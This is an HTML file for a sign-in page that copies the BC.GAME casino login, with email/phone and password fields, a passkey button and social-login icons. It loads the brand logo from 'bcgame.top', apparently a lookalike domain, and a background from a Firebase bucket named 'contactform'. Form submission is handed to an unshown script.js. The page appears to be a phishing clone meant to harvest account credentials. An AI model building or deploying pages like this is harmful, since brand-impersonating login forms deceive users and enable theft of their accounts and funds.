<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BC Game Login</title>
  <link rel="stylesheet" href="styles.css">
  <script src="script.js"></script>
</head>
<body>
  <img src="https://bcgame.top/assets/logo/logo.png" alt="BC.GAME Logo" class="logo">
  <div class="container">
    <!-- Header Section -->
    <div class="header">
      <img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/bg_m-bbb7ec37.webp?alt=media&token=668157aa-9005-4bb9-a4be-915debfc8430" alt="Header Background" class="header-bg">
      <div class="header-content">
        <h1>Sign In</h1>
      </div>
    </div>

    <!-- Form Section -->
    <div class="form-section">
      <form id="login-form" class="login-form">
        <div class="input-group">
          <input id="email-phone" type="text" placeholder="Email / Phone Number" required>
        </div>
        <div class="input-group">
          <input id="password" type="password" placeholder="Password" required>
          <span class="show-password"></span>
        </div>
        <a href="#" class="forgot-password">Forgot your password?</a>
        <button type="submit" class="btn-signin">Sign In</button>
       
      </form>
      <div class="create-account">
        New to BC.GAME? <a href="#">Create account</a>
      </div>
    </div>
   

    <!-- Social Login Section -->
    <div class="social-login">
      <p>Log in directly with</p>
      <button class="passkey-button">
        <img src="https://img.icons8.com/ios-filled/50/ffffff/user-group-man-man.png" alt="Passkey Icon" />
        Sign In with passkey
    </button>
      <div class="social-icons">
        <button><img src="google.png" alt="Google"></button>
        <button><img src="line.png" alt="Apple"></button>
        <button><img src="telegram.png" alt="Meta"></button>
        <button><img src="letter-w.png" alt="Google"></button>
        <button><img src="robotic-arm.png" alt="Google"></button>
        <button class="icon-button">
          <span style="color: #9e9e9e; font-size: 24px; font-weight: bold;">G</span>
      </button>
        <button><img src="fox.png" alt="WhatsApp"></button>
      </div>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
